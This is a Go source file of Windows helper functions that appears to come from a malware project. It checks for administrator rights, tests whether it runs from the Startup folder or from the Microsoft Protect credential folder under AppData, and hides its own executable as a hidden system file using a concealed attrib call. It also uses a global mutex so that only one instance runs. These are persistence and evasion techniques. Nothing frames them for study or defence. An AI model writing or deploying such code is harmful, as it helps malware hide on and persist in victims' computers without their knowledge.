package program

import (
	"fmt"
	"os"
	"os/exec"
	"path/filepath"
	"syscall"

	"golang.org/x/sys/windows"
)

const (
	// AppMutexID is the unique identifier for the application mutex
	AppMutexID = "3575651c-bb47-448e-a514-22865732bbc"
	// StartupPath is the Windows startup programs directory
	StartupPath = "C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\Startup"
	// ProtectDirName is the Microsoft Protect directory name
	ProtectDirName = "Protect"
)

// IsElevated checks if the current process has administrator privileges
// Returns true if the process is running with elevated privileges
func IsElevated() bool {
	ret, _, _ := syscall.NewLazyDLL("shell32.dll").NewProc("IsUserAnAdmin").Call()
	return ret != 0
}

// IsInStartupPath checks if the current executable is in a Windows startup location
// Returns true if the executable is in a startup directory
func IsInStartupPath() bool {
	exePath, err := os.Executable()
	if err != nil {
		return false
	}
	exePath = filepath.Dir(exePath)

	// Check Windows startup directory
	if exePath == StartupPath {
		return true
	}

	// Check Microsoft Protect directory
	protectPath := filepath.Join(os.Getenv("APPDATA"), "Microsoft", ProtectDirName)
	if exePath == protectPath {
		return true
	}

	return false
}

// HideSelf attempts to hide the current executable by setting file attributes
// Uses the attrib command to set hidden and system attributes
func HideSelf() error {
	exe, err := os.Executable()
	if err != nil {
		return fmt.Errorf("failed to get executable path: %w", err)
	}

	cmd := exec.Command("attrib", "+h", "+s", exe)
	cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}

	if err := cmd.Run(); err != nil {
		return fmt.Errorf("failed to hide executable: %w", err)
	}

	return nil
}

// IsAlreadyRunning checks if another instance of the program is already running
// Uses a global mutex to ensure only one instance runs at a time
// Returns true if another instance is running
func IsAlreadyRunning() bool {
	mutexName := fmt.Sprintf("Global\\%s", AppMutexID)
	_, err := windows.CreateMutex(nil, false, syscall.StringToUTF16Ptr(mutexName))
	if err != nil {
		// Error indicates mutex already exists (another instance is running)
		return true
	}
	return false
}
